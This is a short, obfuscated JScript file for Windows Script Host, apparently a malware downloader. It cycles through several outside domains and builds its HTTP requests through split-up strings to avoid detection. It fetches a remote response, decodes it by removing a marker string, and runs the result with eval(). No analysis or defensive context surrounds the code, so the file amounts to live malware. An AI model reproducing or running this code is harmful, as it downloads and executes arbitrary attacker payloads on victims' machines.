
var x = "ippa-max.com bouncinplay.com suburban-sanitation.com aao.hawaiiconvention.com doctors.live".split(" ");
var m = "0000001NZos3xfeQi7UfDYwR24yUL9PttFBeKU1drRUYiYqofCUT4Elijowfndm9BW_vR03h-PFz1zBufdVbZfn6JEWJKI0NYYaFjihtsLIkNkZ-GGan9Aj9RihrDzU";
var zx = 'p';
for (var i=0; i<x.length; i++)
{
	var e = WScript.CreateObject("M"+"SXML2.XMLHTTP");	
	try
	{
		var ter = '/';
		e.open('GET', 
		"h"+"t"+"t"+zx+":"+ter+ter+x[i]+ter+"c"+"o"+"u"+"nter/?"+m,
		
		false);
		e.send();

		var r = e.responseText;

		if (r.length > 1000 && r.indexOf(m) > -1)
		{
			var ikagdh = r.split(m).join("a");
			eval(ikagdh);

			break;
		};
	}
	catch(e)
	{
	};
};